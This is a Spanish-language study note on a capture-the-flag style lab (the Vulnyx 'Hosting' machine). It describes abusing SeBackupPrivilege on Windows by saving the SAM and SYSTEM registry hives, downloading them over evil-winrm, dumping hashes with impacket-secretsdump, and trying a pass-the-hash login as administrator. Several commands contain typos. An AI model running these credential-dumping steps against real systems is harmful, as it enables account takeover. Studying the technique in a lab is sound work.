- Tags: #escalada_privilegios #window #window_escalada_privilegios #recursos #recursos_vulnyx #impacket #impacket_secretsdump

**Recursos**: Maquina Hosting Vulnyx

Explotar el privilegio de SeBackupPrivilege.  Básicamente es que si un usuario tiene el permiso *SeBackupPrivilege* y *SeRestorePrivilege* habilitado en nuestra maquina victima nos permitirá hacer copias de seguridad  de cualquier archivo de la maquina

![](../../../../attachments/Pasted%20image%2020260214073734.png)

Esta vulnerabilidad al permitirnos hacer backup de todos los archivos pues nos permitirá hacer un backup del archivo *SAM* que es la BD donde windows almacena las credenciales de los usuarios en formato de hash. Si se combina este archovo *SAM* con la carpeta *SYSTEM* puedo conseguir convertirme en el usuario *Administrador*

**Articulo recomendado por el Pinguino**: [https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)

Nos creamos un carpeta donde guardaremos las copias de seguridad de los archivos antes mencionados
```bash
mkdir C:\tmp #Creamos la carpeta tem

#Realizamos el backup de la SAM
reg save dir_file_sam dir_donde_guardar\nombre_con_que_guardamos.hive

reg save hklm\sam C:\tmp\sam.hive

#Hacemos lo mismo con la carpeta system

reg save klm\system C:\tmp\system.hive

```

Nos lo descargamos a nuestra maquina , partiendo de que estamos conectados con evil-winrm pues:

```bash
#Nos ubicamos en la carpeta C:\tmp 
download sam.hive
download system.hive
```

Luego con una utilidad de impacket vamos a intentar obtener los hash de los usuarios del sistema .

```bash
impacket-secretsdum -sam sam.hive -sysem system.hive LOCAL
```

![](../../../../attachments/Pasted%20image%2020260214075906.png)

Intentamos un pass the hash con evil-winrm con los usuarios administradores

![](../../../../attachments/Pasted%20image%2020260214080133.png)